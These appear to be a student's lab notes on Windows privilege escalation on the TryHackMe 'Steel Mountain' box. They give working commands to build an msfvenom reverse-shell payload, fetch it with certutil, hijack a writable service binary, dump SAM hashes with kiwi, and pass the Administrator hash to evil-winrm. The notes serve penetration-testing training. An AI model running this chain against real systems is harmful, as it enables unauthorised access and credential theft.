Got initial foot hold using Rejetto HTTP File Server [[PNPT/THM Boxes/SteelMountain/Initial Foothold|Initial Foothold]]

# Enumeration
---
- Upload and run `WinPEAS.exe`
	- ![[Pasted image 20250419060159.png]]

- Find the service details:
	- `sc qc AdvancedSystemCareService9`
		- ![[Pasted image 20250419060341.png]]
- Check if we have write access in `IObut`directory: Yes
	- ![[Pasted image 20250419060441.png]]

# Exploitation
---
- ==**Note**: **We can also make executable with name "ASCService.exe" and place it in Advanced SystemCare to replace the previous binary**==
- Generate `msfvenom`meterpreter binary:
	- `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.98.106 lport=443 -f exe -o Advanced.exe`
- Start python http server
- Transfer in `C:\Program Files (x86)\IObit`:
	- `certutil.exe -urlcache -f http://10.8.98.106/Advanced.exe Advanced.exe`
	- ![[Pasted image 20250419060809.png]]
- Setup msfconsole:
	- `use exploit/multi/handler`
	- `set payload windows/meterpreter/reverse_tcp`
	- `set lhost tun0`
	- `set lport 443`
	- `run`
- Restart the service:
	- `sc stop AdvancedSystemCareService9`
	- `sc start AdvancedSystemCareService9`
	- ![[Pasted image 20250419061207.png]]
- Got the Shell :)
	- ![[Pasted image 20250419061243.png]]
- This shell quickly dies, so lets dump the hashes using `kiwi`:
	- `load kiwi`
	- `lsa_dump_sam`
	- ![[Pasted image 20250419063015.png]]
- Administrator NTLM hash: `53dbf27b0f37b1ef784c8a4768c0e9fa`


# Evil-Winrm
---
- `evil-winrm -i 10.10.155.147 -u Administrator -H '53dbf27b0f37b1ef784c8a4768c0e9fa'`
- 